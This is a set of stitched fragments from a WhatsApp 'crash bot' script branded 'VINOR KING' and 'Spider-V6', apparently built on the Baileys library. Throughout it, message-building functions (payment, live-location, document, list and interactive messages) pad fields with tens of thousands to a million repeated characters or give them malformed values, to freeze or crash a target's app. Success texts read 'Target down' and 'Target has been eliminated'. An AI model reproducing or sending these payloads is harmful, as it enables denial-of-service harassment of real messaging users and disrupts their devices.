...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜VINOR KING⃟🔥᜴#𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜₴ɆⱠ₮₳⃟🔥᜴ # VINOR KING999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍🥷᜴͆VINOR KINGׁׅ֮̿╮⭑ ☠️⃰͜͡؜VINOR KING⃟🔥᜴▴𝒟𝐸𝐿𝒯𝒜𝒞𝑅𝒜𝒮𝐻ཀ͜͡😈⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `✳️᜴࿆͆᷍VINOR 𝕶𝖎𝖓𝖌ׁׅ֮╮⭑ ☠️⃰͜͡؜VINOR 𝕶𝖎𝖓𝖌⃟🔥᜴▴VINOR KING𝚑ཀ͜͡🔥🔥⃟╮.xp`+"ྦྷ".repeat(60000),
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍VINOR KING•₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜VINOR KING⃟🔥᜴▴VINOR KINGӾ99ཀ͜͡😈⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍VINOR KING•₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜VINOR KING⃟🔥᜴▴VINOR KINGӾ99ཀ͜͡😈⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
body: `⁗ ⋄Target down 💀🥹`,
previewType: "VIDEO",
sourceUrl: `༑ VINOR KING💀𝐒𝐩𝐢𝐝𝐞𝐫-𝐕6⿻`,
mediaType: 1,
mediaUrl: 'https://whatsapp.com/channel/0029VaeDVzyF6smxnTiplY0N'
}
},
text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝙎𝙥𝙞𝙙𝙚𝙧-𝙑6* 𝘽𝙮  `VINOR KING` '
}, {
quoted: m
})
}
...
case "delowner":
if (!isOwner) return reply(`𝑌𝑜𝑢 𝑎𝑟𝑒 𝑛𝑜𝑡 𝑚𝑦 𝑜𝑤𝑛𝑒𝑟 𝑑𝑖𝑚𝑤𝑖𝑡`)
if (!args[0]) return reply(`Use ${prefix+command} number\nContact ${prefix+command} 254701157072`)
               ...
               deltaxcrash.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            sourceUrl: 'https://whatsapp.com/channel/0029VaeDVzyF6smxnTiplY0N',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
...
message: {
  "interactiveMessage": {
    ...
    "footer": {
      "text": "›          #🇻꙲꙲🇮꙲꙲🇳꙲꙲🇴꙲꙲🇷꙲꙲ 🇰꙲꙲🇮꙲꙲🇳꙲꙲🇬꙲꙲ ."
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻VINOR KING⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
